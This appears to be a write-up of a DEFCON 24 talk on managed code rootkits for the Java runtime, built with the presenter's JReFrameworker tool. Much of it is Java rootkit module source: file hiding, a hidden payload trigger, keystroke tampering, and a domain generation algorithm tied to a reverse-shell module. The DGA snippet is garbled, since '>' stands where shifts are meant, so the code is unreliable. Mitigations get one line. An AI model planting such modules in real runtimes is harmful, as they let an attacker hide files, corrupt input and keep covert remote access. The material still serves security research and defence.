# Developing Managed Code Rootkits for the Java Runtime Environment

**Presentation at DEFCON 24, August 6th, 2016**

**Presenter: Benjamin Holland (daedared)**
- B.S. in Computer Engineering (2005 - 2010)
- Wabtec Railway Electronics, Ames Lab, Rockwell Collins
- B.S. in Computer Science (2010 - 2011)
- M.S. in Computer Engineering and Information Assurance (2010 - 2012)
- MITRE
- Iowa State University Research (2012 - 2015)
- DARPA Automated Program Analysis for Cybersecurity (APAC) Program
- Ph.D. in Computer Engineering (2015 - Present)
- DARPA Space/Time Analysis for Cybersecurity (STAC) Program

## Introduction
It is an honor to be here at DEFCON 24. My journey into cybersecurity was inspired by early readings of Winn Schwartauâ€™s "Information Warfare." This talk is also inspired by a previous DEFCON presentation.

## Background
### Hello (Weird) World
Let's start with a simple example to illustrate the concept of managed code rootkits.

### Java Runtime Environment (JRE)
The JRE is a critical component in many applications, and compromising it can have far-reaching effects.

## Managed Code Rootkits (MCRs)
- **Post-Exploitation Activity**: Requires root/administrator privileges.
- **Target**: `C:\Program Files\Java\...\lib\rt.jar`
- **Impact**: Affects every program using the modified runtime.
- **Stealth**: Often overlooked in code reviews and forensic investigations.
- **Platform Independence**: If implemented correctly, rootkits can be platform-independent.
- **Features**: Runtimes are already feature-rich, providing object-oriented programming, standard libraries, and access to low-level APIs.

## Strategies for Modifying the Runtime
- **Pioneering Work**: Erez Metula's "ReFrameworker" tool for .NET runtimes (DEFCON 17).
  - XML modules define injection tasks.
  - Generates deployment scripts.
  - Uses an assembler/disassembler pair for modifications.
  - Challenges: Usability, portability, and maintenance.

### New Framework Goals
- **Support for JRE**: Develop MCRs for the Java Runtime Environment.
- **Minimal Prerequisites**: No need for bytecode or intermediate language knowledge.
- **Simple Development Cycle**: Easy development, debugging, and deployment.
- **Portability**: Write Once, Exploit Everywhere.

## JReFrameworker
- **Write Rootkits in Java Source**: Modify behaviors using source annotations.
- **Development and Debugging**: Use Eclipse IDE.
- **Exportable Payload Droppers**: Generate deployable payloads.
- **Bytecode Injections**: Computed on the fly.
- **Open Source**: Available under the MIT License.
  - GitHub: [github.com/benjholla/JReFrameworker](https://github.com/benjholla/JReFrameworker)

### Example: Hello (Weird) World Revisited
```java
@MergeType
public class BackwardsPrintStream extends java.io.PrintStream {
    @MergeMethod
    @Override
    public void println(String str) {
        StringBuilder sb = new StringBuilder(str);
        super.println(sb.reverse().toString());
    }
}
```

### Annotation Types
- **@MergeType**: Defines a class to merge.
- **@MergeMethod**: Specifies methods to override.
- **@DefineField**: Adds fields to existing classes.

## Modules
### Hidden File Module
```java
@MergeType
public class HiddenFile extends java.io.File {
    @MergeMethod
    @Override
    public boolean exists() {
        if (isFile() && getName().equals("secretFile")) {
            return false;
        } else {
            return super.exists();
        }
    }
}
```

### Beetlejuice
```java
@MergeType
public class BeetlejuiceObject extends java.lang.Object {
    @DefineField
    private int beetlejuice;

    @MergeMethod
    public String toString() {
        StackTraceElement[] st = new Exception().getStackTrace();
        for (StackTraceElement element : st) {
            if (element.getMethodName().equals("beetlejuice")) {
                if (++beetlejuice == 3) i.Main.main(new String[]{});
            }
        }
        return super.toString();
    }
}
```
- **Payload**: Invokes Mocha DOOM, a pure Java port of DOOM shareware.
- **GitHub**: [github.com/AXDOOMER/mochadoom](https://github.com/AXDOOMER/mochadoom)

### Reverse Shell + DGA
- **StreamForwarder Class**: Forwards shell inputs/outputs to a TCP stream.
- **Domain Generation Algorithm (DGA)**: Merged into `java.util.Date`.

#### DGA Logic
```java
String domain = "www.";
int year = getYear();
int month = getMonth();
int day = getDay();

for (int i = 0; i < 10; i++) {
    year = ((year & 0xFFFFFFFE) > 11) ^ ((year & 0xFFFFFFF0) > 25) ^ 16 * (month & 0xFFFFFFF8);
    day = ((day ^ (day > 19)) ^ ((day & 0xFFFFFFFE) << 12));
    domain += (char)(((year ^ month ^ day) % 25) + 97);
}

domain += ".com";
```

### SpellWrecker
- **Class Definition**: Inverse of a spellchecker.
- **Behavior**: Injects typos based on typing speed.

```java
@MergeType
public class SpellWreckedKeyEvent extends KeyEvent {
    @MergeMethod
    @Override
    public char getKeyChar() {
        char original = super.getKeyChar();
        return SpellWrecker.spellwreck(original);
    }
}
```

## Mitigations
### Bytecode Modification Indicators
- **Line Numbers**: Anomalies in line numbers can indicate bytecode modifications.

## Q&A
Thank you for your attention! Feel free to ask any questions.

### Resources
- **Setup and Tutorials**: [ben-holland.com/JReFrameworker](http://ben-holland.com/JReFrameworker)
- **Source Code**: [github.com/benjholla/JReFrameworker](https://github.com/benjholla/JReFrameworker)